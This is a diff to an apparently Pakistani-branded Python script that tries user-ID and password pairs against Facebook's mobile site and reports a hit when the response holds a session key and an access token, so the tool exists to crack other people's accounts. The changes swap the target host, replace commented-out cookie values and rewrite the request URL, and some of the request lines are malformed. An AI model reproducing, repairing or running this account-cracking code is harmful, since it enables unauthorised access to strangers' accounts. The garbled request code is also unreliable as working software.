@@ -391,7 +391,7 @@ logo = ("""\033[1;32m
   \033[1;37m[√] YouTube   : \033[1;37mCHAUDHARY TABISH
   \033[1;37m[√] Status    : \033[1;37mPaired 
   \033[1;37m[√] Admin     : \033[1;37mMr SHAFAQAT
-  \033[0;97m[√] 𝙑𝙀𝙍𝙎i𝙊𝙉   :\033[1;31m A.125
+  \033[0;97m[√] 𝙑𝙀𝙍𝙎i𝙊𝙉   :\033[1;31m A.130
 \033[1;97m----------------------------------------------\033[1;37m""")
 
 class Main:
@@ -1255,11 +1255,11 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'free.facebook.com',
+    'authority': 'm.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=MsV9ZUunZoJ0LnHPBdaAeykU; sb=MsV9Zbc5srap5K2cIF-3G0a9; m_pixel_ratio=2.8125; wd=384x745; fr=0MKYMHfvh2NkPKcBV..BlfcUy.Jy.AAA.0.0.BlfcXI.AWUG5doR0FM',
+    # 'cookie': 'datr=8EaEZVa3tY7OKnRTzJW52taq; sb=8EaEZURVWEtdrIYHPBCViYS1; m_pixel_ratio=2.8125; wd=384x745; fr=0uEhEmunyrotnwqGJ..BlhEbw.f-.AAA.0.0.BlhEch.AWW6FozBtko',
     'dpr': '2.8125',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
@@ -1276,7 +1276,7 @@ class Main:
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-			response = ses.get("https://free.facebook.com/?wtsid=rdr_0Rhsdzl7sdWrJEmaF&rtime=1702741323&hrc=1&refsrc=deprecated&_rdr',cookies=cookies,headers=headers") 
+			response = ses.get("https://m.facebook.com/?zero_e=5&zero_et=1703167835&_rdc=1&_rdr&wtsid=rdr_0Ps15Kp1oSMLo8xGV&refsrc=deprecated cookies=cookies,headers=headers") 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[0;92m[Ch Tabish-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
